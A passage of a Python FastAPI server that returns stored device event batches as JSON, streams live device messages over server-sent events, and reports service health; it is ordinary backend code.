                    ORDER BY started_at DESC LIMIT %s
                    """,
                    (*values, limit),
                )
                rows = cursor.fetchall()
    except Exception as error:
        print(f"Could not load raw history: {error}")
        return JSONResponse({"ok": False, "error": "raw storage unavailable"}, status_code=503)
    result = []
    for row in rows:
        try:
            events = json.loads(gzip.decompress(base64.b64decode(row[7])).decode("utf-8"))
        except (ValueError, OSError, json.JSONDecodeError):
            continue
        result.append({
            "batch_id": row[0], "device_id": row[1], "device_name": row[2],
            "session_id": row[3], "started_at": row[4], "ended_at": row[5],
            "event_count": row[6], "events": events,
        })
    return JSONResponse(result)


@app.get("/events")
async def events(
    request: Request, device_id: str | None = None, since: int = 0
):
    selected_device_id = (device_id or "").strip()
    async def event_generator():
        last_seen = max(0, since)
        last_keepalive = time.monotonic()
        while True:
            sent_event = False
            for msg in list(messages):
                msg_id = int(msg["id"])
                if msg_id > last_seen:
                    if not selected_device_id or str(msg.get("device_id")) == selected_device_id:
                        yield f"data: {json.dumps(msg)}\n\n"
                        sent_event = True
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            if time.monotonic() - last_keepalive >= 15:
                yield ": keepalive\n\n"
                last_keepalive = time.monotonic()
            if not sent_event:
                await asyncio.sleep(0.75)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@app.get("/health")
async def health():
    return {
        "ok": True,
        "count": len(messages),
        "started_at": int(SERVICE_STARTED_AT * 1000),
        "uptime_seconds": int(time.time() - SERVICE_STARTED_AT),
    }


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)
